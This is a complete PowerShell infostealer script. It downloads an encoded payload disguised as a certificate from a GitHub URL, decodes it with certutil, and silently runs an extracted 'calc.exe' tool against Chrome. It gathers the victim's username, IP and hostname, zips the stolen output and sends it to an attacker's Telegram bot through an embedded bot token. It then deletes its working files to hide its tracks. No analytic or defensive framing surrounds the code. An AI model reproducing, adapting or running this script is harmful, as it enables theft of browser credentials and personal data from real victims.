# Importing required .NET assembly modules
Add-Type -AssemblyName System.IO.Compression
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Initialize telegram bot info
$botToken = "7878034249:AAHK5E1gTPGZdetu-yvs0hbZU3f29qYICs0"
$chatID = "7781311103"

# Setting up encryption for connection protocol (tls v1.2)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Reconfigure the certificate and install
$working_dir = "$env:TEMP\$env:username\"
If (!(test-path $working_dir)){mkdir $working_dir}
$putin = "$working_dir\certificate.txt"
Invoke-WebRequest 'https://raw.githubusercontent.com/archivemotors/kakoo/refs/heads/main/certificate.cer' -OutFile $putin
$vlad = "$working_dir\$env:username.zip"
# Set-Content -Path $putin -Value $certificate # Writing certificate to disk
Certutil -decode $putin $vlad
$unzipped_dir = "$working_dir\chrome"
[System.IO.Compression.ZipFile]::ExtractToDirectory($vlad, $unzipped_dir)

# Get system info
$username = $env:username
$i = Get-NetIPConfiguration | Where-Object{$_.ipv4defaultgateway -ne $null};
$ip = $i.IPv4Address.ipaddress
$name = Get-ComputerInfo | Where-Object{$_.CsDNSHostName -ne $null}; 
$computer = $name.CsDNSHostName
# Get-ComputerInfo | Out-File -FilePath "$env:TEMP\$ip.txt"

# Get StormShadow and launch silently with stealth
$stormX = "$unzipped_dir\calc.exe"
$return =  Start-Process -Wait -FilePath $stormX -ArgumentList "chrome -m nt -o $working_dir\output" -passthru -NoNewWindow
if (@(0,3010) -contains $return.ExitCode) { 
    try {
        # Build zip archive and prep for exfil 
        $zipFilename = "$working_dir\$username@$computer-$ip.zip"
        $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal
        [System.IO.Compression.ZipFile]::CreateFromDirectory("$working_dir/output",
        $zipfilename, $compressionLevel, $false)
        # Prepare to exfil data
        $filePath = $zipFilename
        # Read file byte-by-byte
        $fileBin = [System.IO.File]::ReadAllBytes($FilePath)
        # Convert byte-array to string
        $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
        $fileEnc = $enc.GetString($fileBin)
        # We need a boundary (something random() will do best)
        $boundary = [System.Guid]::NewGuid().ToString()
        # Linefeed character
        $LF = "`r`n"
        # Build up URI for the API-call
        $uri = "https://api.telegram.org/bot$($botToken)/sendDocument"
        # Build Body for our form-data manually since PS does not support multipart/form-data out of the box
        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$username@$computer-$ip.zip`"",
            "Content-Type: application/octet-stream$LF",
            $fileEnc,
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"$LF",
            $chatID,
            "--$boundary--$LF",
            "Content-Disposition: form-data; name=`"caption`"$LF",
            $output1,
            "--$boundary--$LF"
         ) -join $LF
         
        # Exfil data via telegram api
        Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines 
         
        # Cleaning up
        Remove-Item -Path $working_dir -Recurse
        Remove-Item -Path "$env:TEMP\chrome_appbound_key.txt"
        Remove-Item -Path "$env:TEMP\chrome_decrypt.log"

    }
    catch {
        # Do this if a terminating exception happens #
        Write-Error $_
    }

    return 'Bien Merci!'
} 
else { 
    return 'it is your lucky day!' 
}
